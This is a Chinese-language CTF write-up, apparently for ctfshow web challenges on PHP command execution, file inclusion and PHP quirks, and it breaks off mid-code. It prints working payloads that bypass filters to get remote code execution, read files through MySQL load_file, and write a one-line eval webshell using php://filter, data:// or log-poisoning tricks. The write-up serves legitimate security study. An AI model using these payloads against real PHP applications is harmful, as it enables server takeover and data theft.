<h3 id="web-71"><a href="#web-71" class="headerlink" title="web 71"></a>web 71</h3><p>使用上面方法的时候发现，全是问号</p>
<p>但是遍历根目录的时候可以发现????.???猜测是flag.txt</p>
<p>读取这个方法也全是问号，想到用utf-8编码看一下是不是编码问题</p>
<p>查看源代码发现下面有一层过滤</p>
<p>可以用exit();跳过这层过滤</p>
<h3 id="web-72"><a href="#web-72" class="headerlink" title="web 72"></a>web 72</h3><h3 id="web-73"><a href="#web-73" class="headerlink" title="web 73"></a>web 73</h3><p>先用var_export遍历一下目录发现根目录下面的flagc.txt文件</p>
<p>然后include包含这个文件就可以</p>
<h3 id="web-74"><a href="#web-74" class="headerlink" title="web 74"></a>web 74</h3><p>这里过滤掉了dir相关的函数</p>
<p>用glob函数过</p>
<p>使用方法：``</p>
<p>glob(‘./*’)遍历当前目录下的文件</p>
<h3 id="web-75-76"><a href="#web-75-76" class="headerlink" title="web 75-76"></a>web 75-76</h3><p>用到了php中保存目录的类：Directoryiterator</p>
<p>DirectoryIterator 类提供了一个简单的界面来查看文件系统目录的内容。</p>
<p>我们可以直接在网页中编写实例一个DirectoryIterator对象，然后用一个循环遍历出它里面包含的文件</p>
<p>payload：</p>
<p><code>?&gt;&lt;?php $a = new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo $f-&gt;__toString().&quot; &quot;;&#125;exit();</code></p>
<p>可以找到flag36.txt文件</p>
<p>这里需要用到PDO类链接数据库</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">php页面链接数据库例子：</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="meta">$</span><span class="bash">dbms=<span class="string">&#x27;mysql&#x27;</span>;     //数据库类型</span></span><br><span class="line"><span class="meta">$</span><span class="bash">host=<span class="string">&#x27;localhost&#x27;</span>; //数据库主机名</span></span><br><span class="line"><span class="meta">$</span><span class="bash">dbName=<span class="string">&#x27;test&#x27;</span>;    //使用的数据库</span></span><br><span class="line"><span class="meta">$</span><span class="bash">user=<span class="string">&#x27;root&#x27;</span>;      //数据库连接用户名</span></span><br><span class="line"><span class="meta">$</span><span class="bash">pass=<span class="string">&#x27;&#x27;</span>;          //对应的密码</span></span><br><span class="line"><span class="meta">$</span><span class="bash">dsn=<span class="string">&quot;<span class="variable">$dbms</span>:host=<span class="variable">$host</span>;dbname=<span class="variable">$dbName</span>&quot;</span>;</span></span><br></pre></td></tr></table></figure>

<p>所以我们现在需要初始化的内容<code>$dbh = new PDO($dsn, $user, $pass); *//初始化一个PDO对象*</code></p>
<p>需要提供账号密码还有数据库信息</p>
<p>也不知道师傅们是怎么拿到数据库的信息的：</p>
<p>payload：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">try&#123;</span><br><span class="line"><span class="meta">	$</span><span class="bash">dbh = new PDO(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>);</span></span><br><span class="line"><span class="meta">	foreach($</span><span class="bash">dbh-&gt;query(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>)as <span class="variable">$row</span>)&#123;<span class="comment">#76是36d</span></span></span><br><span class="line"><span class="meta">		echo($</span><span class="bash">row[0]).<span class="string">&quot;|&quot;</span>;&#125;</span></span><br><span class="line"><span class="meta">		$</span><span class="bash">dbh = NULL;</span></span><br><span class="line">	</span><br><span class="line">&#125;catch (POException $e)&#123;</span><br><span class="line">	echo $e-&gt;getMessage();</span><br><span class="line">	die();	</span><br><span class="line">	&#125;exit();</span><br></pre></td></tr></table></figure>



<p>c=try {$dbh = new PDO(‘mysql:host=localhost;dbname=ctftraining’, ‘root’, ‘root’);foreach($dbh-&gt;query(‘select load_file(“/flag36.txt”)’) as $row) {echo($row[0]).”|”; }$dbh = null;}catch (PDOException $e) {echo $e- &gt;getMessage();<strong>exit</strong>(0);}<strong>exit</strong>(0);</p>
<p>原理：在数据库中查找flag36.txt然后抛出异常，输出其中内容</p>
<h3 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h3><p>一样可以用上面的代码读取到文件目录，可以看到flag在falg36x.txt或者readflag中</p>
<p>但是我们用上面的sql方法读取文件的时候发现，sql被ban了，得想另一种办法</p>
<p>可以利用FFI（但是FFI只有在php7.4之后才有）</p>
<p>新姿势：$ffi = FFI::cdef(“int system(const char *command);”);创建一个system对象</p>
<p>然后将readflag重定向</p>
<p>最后调用system执行$a</p>
<p>最后访问我们重定向的文件</p>
<h3 id="web-118"><a href="#web-118" class="headerlink" title="web 118"></a>web 118</h3><p>这题又是一个新姿势，我们可以利用环境变量或者路径含有的字母来执行命令</p>
<p>这题没有过滤空格还有路径包含</p>
<p>而且给出的提示中有当前目录是/var/www/html</p>
<p>以及环境变量是/bin</p>
<p>我们可以调用环境变量的最后一个字母（~A）以及当前目录中最后一个字母组成nl后面包含题目给我们的flag所在位置（？没有被ban）</p>
<p>最终payload：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">&#123;PATH~A&#125;<span class="variable">$&#123;PWD~A&#125;</span>????.???</span></span><br></pre></td></tr></table></figure>

<p>附上LINUX的环境变量：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">查看环境变量  (environment)</span><br><span class="line">env</span><br><span class="line">一些环境变量说明</span><br><span class="line">HOSTNAME=linux.dmtsai.tw  主机名称</span><br><span class="line">SHELL=/bin/bash  当前环境下，使用的shell是哪一个程序。</span><br><span class="line">TERM=xterm  终端使用的环境是什么类型</span><br><span class="line">HISTSIZE=1000 记录命令的数目</span><br><span class="line">USER=root  用户的名称</span><br><span class="line">ENV=/root/.bashrc  使用的个人环境设置文件</span><br><span class="line">MAIL=/var/spool/mail/root  这个用户所采用的邮箱位置</span><br><span class="line">PATH=/sbin:/usr/sbin:/bin  执行文件命令搜索路径</span><br><span class="line">PWD=/root  当前用户所在的工作目录(利用pwd取出)</span><br><span class="line">LANG=en_US,UTF-8 与语系有关</span><br><span class="line">HOME=/root 用户的家目录</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="web-119"><a href="#web-119" class="headerlink" title="web 119"></a>web 119</h3><p>跟上题类似但是需要构造不一样的东西上题构造的是无法用的</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0:</span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;<span class="comment">#&#125;</span></span></span><br><span class="line">1:</span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;<span class="comment">##&#125;</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;<span class="comment">#SHLVL&#125;</span></span></span><br><span class="line">4-5:</span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;<span class="comment">#RANDOM&#125;</span></span></span><br><span class="line">/:</span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;HOME:<span class="variable">$&#123;#&#125;</span>:<span class="variable">$&#123;##&#125;</span>&#125;</span></span><br><span class="line">t:</span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;HOME:<span class="variable">$&#123;#HOSTNAME&#125;</span>:<span class="variable">$&#123;#SHLVL&#125;</span>&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">1 PHP_CFLAGS=-fstack-protectcor-strong-fpic-fpie-o2-D_LARGEFILE_SOURCE -D_FI</span><br><span class="line">LE_OFFSET_BITS=64</span><br><span class="line">2</span><br><span class="line">3 PHP_VERSION=7.3.22 /版本</span><br><span class="line">4 SHLVL=2 /記錄多個bash進程實例嵌套深度的累加器</span><br><span class="line">5 [PATH] =&gt; /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">6 [HOSTNAME] =&gt; glot-runner /主機名</span><br><span class="line">[PHPIZE_DEPS] =&gt; autoconf dpkg-dev file g++</span><br><span class="line">gcc libc-dev make pkg-config re2c</span><br><span class="line">7</span><br><span class="line">8 [PHP_INI_DIR] =&gt; /usr/local/etc/php</span><br><span class="line">9 [PHP_CFLAGS] =&gt; -fstack-protector-strong -fpic -fpie -O2</span><br><span class="line">10 [PHP_CPPFLAGS] =&gt; -fstack-protector-strong -fpic -fpie -O2</span><br><span class="line">11 [PHP_LDFLAGS] =&gt; -Wl,-O1 -Wl,--hash-style=both -pie</span><br><span class="line">[GPG_KEYS] =&gt; 1729F83938DA44E27BA0F4D3DBDB397470D12172 B1B44D8F021E4E2</span><br><span class="line">D6021E995DC9FF8D3EE5AF27F</span><br><span class="line">12</span><br><span class="line">13 [PHP_VERSION] =&gt; 7.2.1</span><br><span class="line">14</span><br><span class="line">[PHP_ASC_URL] =&gt; https://secure.php.net/get/php-7.2.1.tar.xz.asc/from/</span><br><span class="line">this/mirror</span><br><span class="line">15</span><br><span class="line">[PHP_SHA256] =&gt; 6c6cf82fda6660ed963821eb0525214bb3547e8e29f447b9c15b2d</span><br><span class="line">8e6efd8822</span><br><span class="line">16</span><br><span class="line">17 [PHP_MD5] =&gt;</span><br><span class="line">18 [HOME] =&gt; /home/glot</span><br><span class="line">19 [PHP_SELF] =&gt; /tmp/543750210/main.php</span><br><span class="line">20 [SCRIPT_NAME] =&gt; /tmp/543750210/main.php</span><br><span class="line">21 [SCRIPT_FILENAME] =&gt; /tmp/543750210/main.php</span><br><span class="line">22 [PATH_TRANSLATED] =&gt; /tmp/543750210/main.php</span><br><span class="line">23 [DOCUMENT_ROOT] =&gt;</span><br><span class="line">24 [REQUEST_TIME_FLOAT] =&gt; 1524198667.12</span><br><span class="line">25 [REQUEST_TIME] =&gt; 1524198667</span><br><span class="line">26 [argv] =&gt; Array</span><br><span class="line">27 (</span><br><span class="line">28 [0] =&gt; /tmp/543750210/main.php</span><br><span class="line">29 )</span><br><span class="line">30 [argc] =&gt; 1</span><br><span class="line">31 )</span><br></pre></td></tr></table></figure>

<p>非预期：</p>
<p>可以看到PHP_CFLAGS中含有tac，直接构造数字3取PHP_CFLAGS的第三个的三位就行了</p>
<h3 id="web-120"><a href="#web-120" class="headerlink" title="web 120"></a>web 120</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"><span class="meta">if(isset($</span><span class="bash">_POST[<span class="string">&#x27;code&#x27;</span>]))&#123;</span></span><br><span class="line">    $code=$_POST[&#x27;code&#x27;];</span><br><span class="line">    if(!preg_match(&#x27;/\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;, $code))&#123;    </span><br><span class="line">        if(strlen($code)&gt;65)&#123;</span><br><span class="line">            echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.&#x27;you are so long , I dont like &#x27;.&#x27;&lt;/div&gt;&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">        echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.system($code).&#x27;&lt;/div&gt;&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">     echo &#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<p>上面的题目虽然没有过滤，但是我们用的长度太长了会被后面的小于65pass</p>
<p>所以我们的换一种方法构造</p>
<p>可以尝试一下构造base64</p>
<p>我们只需要构造出4和6</p>
<p>我们还记得118的提示</p>
<p>然后PHP_VERSION的长度是6</p>
<p>pwd的长度是4</p>
<p>可以构造</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">????$&#123;#PWD&#125; ????.???  #base64 flag.php</span><br></pre></td></tr></table></figure>

<p>但是没办法执行，应该是位置发生了什么变化把，换一种方法，构造出/bin然后直接执行看看</p>
<p>想到可以构造/bin/base64 ????.???</p>
<p>现在的问题就是构造一个/</p>
<p>可以用pwd的第一个字符就是/</p>
<p><code>$&#123;PWD::$</code>的效果跟他一样的直接替换</p>
<p>替换之后用上面的payload继续打</p>
<h3 id="web-122"><a href="#web-122" class="headerlink" title="web 122"></a>web 122</h3><p>可以看到我们用pwd提取/但是pwd被过滤了</p>
<p>发现没有过滤HOME，而且HOME返回的是家目录也是含有/但是#也被过滤了查了一下可以用<code>$?</code>，它表示上一条命令的返回值，如果是0则表示执行成功，如果是非0则表示执行有误</p>
<p>用<code>$&#123;HOME::$?&#125;</code></p>
<h3 id="web-124"><a href="#web-124" class="headerlink" title="web 124"></a>web 124</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><br><span class="line">if(!isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    //例子 c=20-1</span><br><span class="line">    $content = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if (strlen($content) &gt;= 80) &#123;</span><br><span class="line">        die(&quot;太长了不会算&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [&#x27; &#x27;, &#x27;\t&#x27;, &#x27;\r&#x27;, &#x27;\n&#x27;,&#x27;\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\[&#x27;, &#x27;\]&#x27;];</span><br><span class="line">    foreach ($blacklist as $blackitem) &#123;</span><br><span class="line">        if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $content)) &#123;</span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的字符&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span><br><span class="line">    $whitelist = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;, &#x27;base_convert&#x27;, &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27;, &#x27;dechex&#x27;, &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;];</span><br><span class="line">    preg_match_all(&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;, $content, $used_funcs);  </span><br><span class="line">    foreach ($used_funcs[0] as $func) &#123;</span><br><span class="line">        if (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的函数&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //帮你算出答案</span><br><span class="line">    eval(&#x27;echo &#x27;.$content.&#x27;;&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这道题同样限制了长度，并且添加了黑白名单：</p>
<p>过滤了<code>空格，换行，tab，单双引号还有中括号</code></p>
<p>他特别提示了用到数学符号，而且在这边给出了进制转换的几个函数：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">base_convert随机进制转换</span><br><span class="line">hexdec十六进制转换成十进制</span><br><span class="line">dechex十进制转换成十六进制</span><br><span class="line">原本只需要base_convert就足够了，但是这题同样限制了80长度，只用这个的话长度不够，所以我们必须结合利用</span><br><span class="line">我们知道我们在执行的时候是以二进制数据进行程序执行的</span><br><span class="line">所以我们可以构造rce</span><br><span class="line">以GET方式传入一个数，然后我们就可以随机构造我们想要的系统命令了</span><br></pre></td></tr></table></figure>

<p>可以看到我们直可以用它给的函数还有数字，还有除了上面其余符号，</p>
<p>我们可以构造一个十进制，然后让他转换成二进制字符串，但是上面没有给我们函数来转换成2进制字符串</p>
<p>所以说我们需要构造一个参数让他转换成2进制字符串</p>
<p>看了一下他给的数学函数需要返回字符串的话我们只能使用</p>
<p><code>hex2bin</code>函数，这个函数会将16进制转换成二进制字符串</p>
<p>也就是说我们需要用base_convert转换出hex2bin</p>
<p>直接去找一个在线网站转换就行了<code>37907361743</code></p>
<p>然后构造base_convert(37907361743,10,36)就可以构造出hex2bin</p>
<p>然后我们就可以构造一个_GET了</p>
<p>1598506324</p>
<p>然后直接拼接</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base_convert(37907361743,10,36)(dechex(1598506324))#_GET</span><br></pre></td></tr></table></figure>

<p>这样我们就构造好了_GET因为中括号被过滤了我们可以用大括号代替中间的就用上面给定的函数来覆盖，</p>
<p>可以构造$pi=base_convert(37907361743,10,36)(dechex(1598506324))</p>
<p>因为长度限定我们可以使用变量定义一下，把这个复制给$pi</p>
<p>然后用$$pi构造出$_GET{abs}，但是因为我们没办法使用单引号，所以我们还需要构造一个参数，然后让他组成<code>函数（参数）</code>的方式，然后函数，参数都用get传入</p>
<p>也就是说需要构造<code>c=$_GET&#123;abs&#125;（$_GET&#123;exp&#125;）</code>然后我们再传入abs还有exp就可以rce</p>
<p>payload：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;abs&#125;($$pi&#123;exp&#125;);&amp;abs=system&amp;exp=tac f*</span><br></pre></td></tr></table></figure>

<h2 id="——命令执行结束——"><a href="#——命令执行结束——" class="headerlink" title="——命令执行结束——"></a>——命令执行结束——</h2><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="web-78"><a href="#web-78" class="headerlink" title="web 78"></a>web 78</h3><p>用php伪协议</p>
<h3 id="web-79"><a href="#web-79" class="headerlink" title="web 79"></a>web 79</h3><p>用data伪协议</p>
<h3 id="web-80"><a href="#web-80" class="headerlink" title="web 80"></a>web 80</h3><p>随便输入一个页面查看服务器的系统</p>
<p>用file伪协议抓包之后在网页的标头信息构造漏洞在日志文件中getshell</p>
<h3 id="web-81"><a href="#web-81" class="headerlink" title="web 81"></a>web 81</h3><p>直接file=文件的日志文件</p>
<p>然后抓包构造标头</p>
<h3 id="web-82-86"><a href="#web-82-86" class="headerlink" title="web 82-86"></a>web 82-86</h3><p>环境有问题，现在没办法做</p>
<h3 id="web-87"><a href="#web-87" class="headerlink" title="web 87"></a>web 87</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta">if(isset($</span><span class="bash">_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span></span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $content = $_POST[&#x27;content&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">    file_put_contents(urldecode($file), &quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;.$content);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们需要写入content数据写进file中，但是要绕过这个die</p>
<p>考到了伪协议绕过，我们可以用伪协议编码绕过，用base64或者是rot13base64解码的时候<?;>等会被忽略，最后也就会变成phpdie然后添加两个字符之后对后面的数再继续进行解码这样我们就直接绕过了这个死亡杂糅（我这题base64没做出来，用的rot13）rot13编码之后` <?php die('大佬别秀了');?><code>会变成</code><?cuc qvr('大佬别秀了');?>`再进行一次编码他就会恢复原状，如果php没有开启短标签的话，php不认识这个字符那么他就不会执行，我们直接在后面添加我们想要输入的代码然后进行一次rot13编码，当他在进行一次rot13编码的时候，他就会变成我们想要输入的原始形态，就绕过了前面的die不会退出。</p>
<p>参考链接：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://xz.aliyun.com/t/8163#toc-3</span><br><span class="line">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</span><br></pre></td></tr></table></figure>



<h3 id="web-88"><a href="#web-88" class="headerlink" title="web 88"></a>web 88</h3><p>过滤的字符串</p>
<p>php ~ !   @ #   $   %  ^  &amp;  *   (     )   -    _  +  =  .</p>
<p>跟前面一样，可以直接用data伪协议读，但是解码之后最后可能会有= + 等符号，可以在后面直接加几个1来混淆</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:text/plain;base64,加上base64编码</span><br></pre></td></tr></table></figure>

<p>payload：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data:text/plain;base64,PD9waHAgZXZhbChzeXN0ZW0oJ2NhdCBmKicpKTsgPz4xMTEx</span><br></pre></td></tr></table></figure>



<h3 id="web-116"><a href="#web-116" class="headerlink" title="web 116"></a>web 116</h3><p>打开可以看到是一个MP4文件，先下载下来然后用foremost分离</p>
<p>打开png文件发现图片就是源码</p>
<p>审计发现直接get方式传入一个file名就行了但是需要抓个包才能看返回值</p>
<h3 id="web-117"><a href="#web-117" class="headerlink" title="web 117"></a>web 117</h3><h4 id="ucs-2编码"><a href="#ucs-2编码" class="headerlink" title="ucs-2编码"></a>ucs-2编码</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo iconv(&quot;UCS-2LE&quot;,&quot;UCS-2BE&quot;,&#x27;&lt;?php eval($_POST[a]); ?&gt;&#x27;);</span><br></pre></td></tr></table></figure>

<p>他的返回值就是经过编码之后的</p>
<p>然后我们直接用伪协议写<code>php://filter/write=convert.UCS-2LE.UCS-2BE/resource=a.php</code></p>
<p>来写入文件到a.php</p>
<p>contents传入我们转码之后的一句话木马</p>
<p>contents=?&lt;hp+pvela$(P_SO[T]1;)&gt;?也就是<code>&lt;?php eval($_POST[1]); ?&gt;</code></p>
<h3 id="——-文件包含也结束了——"><a href="#——-文件包含也结束了——" class="headerlink" title="——-文件包含也结束了——-"></a>——-文件包含也结束了——-</h3><h2 id="php特性"><a href="#php特性" class="headerlink" title="php特性"></a>php特性</h2><h4 id="web-89"><a href="#web-89" class="headerlink" title="web 89"></a>web 89</h4><p>数组绕过</p>
<h3 id="web-90"><a href="#web-90" class="headerlink" title="web 90"></a>web 90</h3><p>进制转换，4476转换成八进制就行了首位添加0</p>
<h3 id="web-91"><a href="#web-91" class="headerlink" title="web 91"></a>web 91</h3><p>考到了/i以及/im的区别</p>
<p>im匹配换行符</p>
<h3 id="web-92-93"><a href="#web-92-93" class="headerlink" title="web 92-93"></a>web 92-93</h3><p>同上面的90一样</p>
<h3 id="web-94"><a href="#web-94" class="headerlink" title="web 94"></a>web 94</h3><p>多了一些条件，首位不能是0，不能含有字母，不能等于4476</p>
<p>我们可以构造小数，绕过前面然后到后面intval函数直接变成int4476</p>
<h3 id="web-95"><a href="#web-95" class="headerlink" title="web 95"></a>web 95</h3><p>过滤了flag.php</p>
<p>因为知道flag.php是在当前目录下</p>
<p>当前目录下的文件可以用./+文件名表示</p>
<h3 id="web-96"><a href="#web-96" class="headerlink" title="web 96"></a>web 96</h3><p>标准的MD5绕过，可以用数组</p>
<h3 id="web-97"><a href="#web-97" class="headerlink" title="web 97"></a>web 97</h3><p>用数组绕过</p>
<h3 id="web-98"><a href="#web-98" class="headerlink" title="web 98"></a>web 98</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"><span class="meta">$</span><span class="bash">_GET?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">_GET[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">_GET[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;</span></span><br><span class="line"><span class="meta">highlight_file($</span><span class="bash">_GET[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span 